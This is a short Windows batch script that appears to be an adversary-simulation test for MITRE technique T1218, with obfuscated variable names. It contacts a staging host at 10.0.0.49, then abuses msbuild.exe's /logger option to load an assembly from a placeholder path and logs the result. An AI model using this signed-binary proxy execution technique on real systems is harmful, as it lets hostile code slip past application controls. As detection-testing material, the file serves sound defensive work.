@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

SET pjkcpgw=DUMMY
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?7571-10
SET hlbnp=ITZEL-S2B
SET pudaazx=10
SET syjfr=surfshark.txt
SET ewjmdkff=7571

SET oiqdffw=%APPDATA%\!pudaazx!\macula-simulations.log
SET wdvrfe=1
SET jfvgvgh=
SET mbfgrt=T1218
SET ibndtv=Signed Binary Proxy Execution

REM Check server availability first
curl -k -s -o nul !drguvr!

REM Execute LoggerEntry via msbuild.exe
msbuild.exe /logger:LoggerEntry,!pjkcpgw!\\!syjfr!;MyParameters,Foo
IF !ERRORLEVEL! NEQ 0 (
    SET wdvrfe=0
    SET jfvgvgh=assembly_load_failed
)

REM Normalize timestamp to YYYY-MM-DD HH:MM:SS.SSS
SET plbmkj=!DATE:~-4!-!DATE:~-7,2!-!DATE:~-10,2!
SET vckbt=!TIME: =0!
SET vckbt=!vckbt:.=:!
SET vckbt=!vckbt:,=.!
IF "!vckbt:~1,1!"==":" SET vckbt=0!vckbt!
SET qnbvt=!plbmkj! !vckbt:~0,2!:!vckbt:~3,2!:!vckbt:~6,5!

REM Log TTP execution
(echo [!qnbvt!][!hlbnp!]: !pudaazx!-!ewjmdkff!-!mbfgrt!|!ibndtv!=!wdvrfe!:!jfvgvgh!) >> "!oiqdffw!" 2>nul || rem